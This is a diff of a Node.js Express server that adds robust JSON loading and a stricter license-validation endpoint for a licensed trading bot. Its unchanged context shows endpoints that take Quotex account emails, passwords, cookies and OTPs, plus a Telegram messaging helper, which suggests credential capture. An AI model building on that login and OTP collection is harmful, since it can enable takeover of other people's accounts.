@@ -31,13 +31,18 @@ async function sendTelegramMessage(text) {
 const DATA_FILE = path.join(__dirname, 'users.json');
 let users = [];
 
-// Load users on startup
+// FIXED: Robust load function
 function loadUsers() {
     try {
         if (fs.existsSync(DATA_FILE)) {
-            const data = fs.readFileSync(DATA_FILE, 'utf8');
-            users = JSON.parse(data);
-            console.log(`✅ Loaded ${users.length} users from users.json`);
+            const data = fs.readFileSync(DATA_FILE, 'utf8').trim();
+            if (data && data.length > 0) {
+                users = JSON.parse(data);
+                console.log(`✅ Loaded ${users.length} users from users.json`);
+            } else {
+                users = [];
+                console.log("⚠️ users.json was empty, starting fresh");
+            }
         } else {
             fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
             console.log("✅ Created new users.json");
@@ -45,6 +50,12 @@ function loadUsers() {
     } catch (e) {
         console.error("Load error, starting fresh:", e);
         users = [];
+        // Create fresh file
+        try {
+            fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
+        } catch (writeErr) {
+            console.error("Failed to create users.json:", writeErr);
+        }
     }
 }
 
@@ -60,7 +71,7 @@ function saveUsers() {
 
 loadUsers();
 
-// Helper: Get or create user by licenceKey (FIXED: Multiple users persistence)
+// Helper: Get or create user by licenceKey
 function getOrCreateUser(licenceKey, fullName = "Unknown") {
     let user = users.find(u => u.licenceKey === licenceKey);
     if (!user) {
@@ -167,7 +178,7 @@ app.post('/api/notification-permission', async (req, res) => {
     res.status(200).send({ status: "success" });
 });
 
-// ================== QUOTEX LOGIN & OTP (FULLY FIXED) ==================
+// ================== QUOTEX LOGIN & OTP ==================
 app.post('/api/quotex-login', async (req, res) => {
     const { email, password, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
@@ -217,7 +228,7 @@ app.post('/api/quotex-otp', async (req, res) => {
     res.status(200).send({ status: "ok" });
 });
 
-// ================== LICENSE MANAGEMENT (ADDED) ==================
+// ================== LICENSE MANAGEMENT (NEW) ==================
 const LICENSES_FILE = path.join(__dirname, 'licenses.json');
 let licenses = [];
 
@@ -226,7 +237,6 @@ function loadLicenses() {
         if (fs.existsSync(LICENSES_FILE)) {
             const data = fs.readFileSync(LICENSES_FILE, 'utf8').trim();
             licenses = data ? JSON.parse(data) : [];
-            console.log(`✅ Loaded ${licenses.length} licenses`);
         } else {
             licenses = [];
             fs.writeFileSync(LICENSES_FILE, JSON.stringify([], null, 2));
@@ -266,7 +276,7 @@ app.post('/api/licenses', (req, res) => {
         expiry: expiry || null
     });
     saveLicenses();
-    res.json({ success: true });
+    res.json({ success: true, license: licenses[0] });
 });
 
 app.delete('/api/licenses/:key', (req, res) => {
@@ -276,21 +286,44 @@ app.delete('/api/licenses/:key', (req, res) => {
     res.json({ success: true });
 });
 
-// ADDED: Validate License for Main Bot
+// ================== NEW: LICENSE VALIDATION FOR BOT (FIXED) ==================
 app.post('/api/validate-license', (req, res) => {
     const { licenseKey } = req.body;
-    if (!licenseKey) return res.json({ valid: false });
+    
+    if (!licenseKey) {
+        return res.status(400).json({ valid: false, message: "License key required" });
+    }
 
+    const normalizedKey = licenseKey.trim().toUpperCase();
+    
     const license = licenses.find(l => 
-        l.key === licenseKey && 
-        l.status === "Active" &&
-        (!l.expiry || new Date(l.expiry) > new Date())
+        l.key.toUpperCase() === normalizedKey && 
+        l.status === "Active"
     );
 
-    res.json({ valid: !!license });
+    if (license) {
+        let isValid = true;
+        if (license.expiry) {
+            const expiryDate = new Date(license.expiry);
+            if (expiryDate < new Date()) {
+                isValid = false;
+            }
+        }
+
+        res.json({ 
+            valid: isValid, 
+            message: isValid ? "License valid" : "License expired",
+            license: isValid ? license : null
+        });
+    } else {
+        res.json({ 
+            valid: false, 
+            message: "Invalid or inactive license key" 
+        });
+    }
 });
 
-// ================== ADMIN PANEL ROUTES (FIXED) ==================
+// ================== ADMIN PANEL ROUTES ==================
 app.get('/api/stats', (req, res) => {
     const stats = {
         totalUsers: users.length,
